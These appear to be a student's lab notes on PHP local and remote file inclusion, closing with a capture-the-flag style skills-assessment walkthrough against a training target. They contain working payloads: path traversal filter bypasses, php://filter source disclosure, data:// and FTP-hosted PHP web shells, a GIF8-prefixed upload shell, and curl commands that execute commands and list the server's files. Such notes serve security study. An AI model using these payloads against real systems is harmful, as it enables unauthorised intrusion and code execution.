# File Inclusion

## File Disclosure

### What I learned
- Path traversal filters can be bypassed with `....//` as server is configured to remove `../` by stripping it. By adding additional dots and slashes, after removing `../` from `....//` we are left with `../`, which is exactly what we want to go one directory back.
- URL encoding can bypass blacklists.
- Server can use several types of filtering to prevent LFI.
- Code disclosure is possible using base64 filters.
```url
php://filter/read=convert.base64-encode/resource=phpfilename
````

and then decode the base64 output to view potentially useful information.

- ffuf can be used not only for directory or subdomain fuzzing.
    

## What confused me

- Thought that non-recursive removal removes only the first specified string `../`, so it would be possible to bypass it with just `....//../../../etc/passwd`, but found out that it deletes **each** `../` in the text and not just once. Because of that `....//....//....//....//etc/passwd` is required to bypass non-recursive removal.
    
- Could not figure out why:
    
```bash
curl -s 'http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat flag.txt'
```

does not work. Later found out that all spaces in the URL must be replaced with `%20`.

### What I'd do differently

- Test one bypass technique at a time instead of combining them randomly.
    
- Check PHP version and configuration before trying RCE methods.
    

## Remote Command Execution

### New Ideas

- You can start not only an HTTP server with python but also an FTP server in case of firewall restrictions or if `http://` string gets blocked.
    

```bash
sudo python -m pyftpdlib -p 21
```

- If server requires authentication the credentials can be specified as follows:
    

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

- SMB server can be used if server is hosted on a Windows machine. We can use impacket to do that:
    

```bash
impacket-smbserver -smb2support share $(pwd)
```

- Upload file path can often be found in the source code of the page.
    

### Bypasses / payloads


```bash
<?php system($_GET["cmd"]); ?>
```

```bash
GIF8<?php system($_GET["cmd"]); ?>
```

```bash
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

### Pitfalls

- Was confused because the RCE after file upload did not work:
    

```bash
http://<TARGET>/index.php?language=/profile_images/shell.gif&cmd=id
```

On further review found that `.` is required before `/profile_images`, so the full URL should be:

```bash
http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=id
```

- GIF8 string that is added confused me at first, as I thought it was part of the file name, but it is actually part of the file **content** used to bypass file type checks.
    

```bash
curl -s "http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=ls%20../../../../"
<!DOCTYPE html>
<...SNIP...>
           <h2>Containers</h2>
           GIF82f40d853e2d4768d87da1c81772bae0a.txt
bin
boot
dev
etc
home
<...SNIP...>
```

### Skills Assessment - File Inclusion
First thing by looking at the pages of the website only Apply seems to be interesting with it i can upload file and if it is not sanitized properly can lead to RCE.
[Skill Assesment](screenshots/Screenshot_20260127_120815.png)

After submitting the form with payload `<?php system($_GET["cmd"]); ?>` was redirected to another page a found possible attack vector `n=value`
[Skill Assesment](screenshots/Screenshot_20260127_121456.png)

Tried different payloads used fuzz for for fuzzing with word lists and did not found something, so i decided to peak in source code of the page and found that images are saved in `/api/image.php?p=value`

[Skill Assesment](screenshots/Screenshot_20260127_121931.png)

tried a couple of difference payloads and found that it has none recursive removal which removes `../` to prevent path travel but which is easily bypassed by doubling it `....//`. I was stack on it for a while but but by looking again but now at `apply.php` source code i found that it uses `/api/application.php`, so I will try to read it and possibly find something interesting.
```bash
curl "http://94.237.120.233:53829/api/image.php?p=....//api/application.php"  
<?php  
$firstName = $_POST["firstName"];  
$lastName = $_POST["lastName"];  
$email = $_POST["email"];  
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;  
  
$tmp_name = $_FILES["file"]["tmp_name"];  
$file_name = $_FILES["file"]["name"];  
$ext = end((explode(".", $file_name)));  
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;  
move_uploaded_file($tmp_name, $target_file);  
  
header("Location: /thanks.php?n=" . urlencode($firstName));  
?>
```
found that file is saved at  `../uploads/md5 of the file name` , so I tried to find and execute the uploaded file
```bash
curl "http://94.237.120.233:53829/api/image.php?p=....//uploads/fc023fcacb27a7ad72d605c4e300b389.php&cmd=ls"  
<?php system($_GET["cmd"]); ?>
```
but was only to able to read its content, so i begin looking in other places. After reading contact.php internally i found:
```bash
                   <?php  
                   $region = "AT";  
                   $danger = false;  
  
                   if (isset($_GET["region"])) {  
                       if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {  
                           echo "'region' parameter contains invalid character(s)";  
                           $danger = true;  
                       } else {  
                           $region = urldecode($_GET["region"]);  
                       }  
                   }  
  
                   if (!$danger) {  
                       include "./regions/" . $region . ".php";  
                   }  
                   ?>
```
which is showing that contact.php has user input which is exploitable as it decode URL only once. Now I can go to any URL decoder and encode this twice `../uploads/fc023fcacb27a7ad72d605c4e300b389` which will lead to `%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389`
```bash
url "http://94.237.120.233:53829/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20/"         
<html>  
<...SNIP...> 
boot  
dev  
etc  
flag_09ebca.txt  
home  
lib  
lib64  
media  
mnt  
<...SNIP...>
</html>
```
now you can successfully crab the flag.
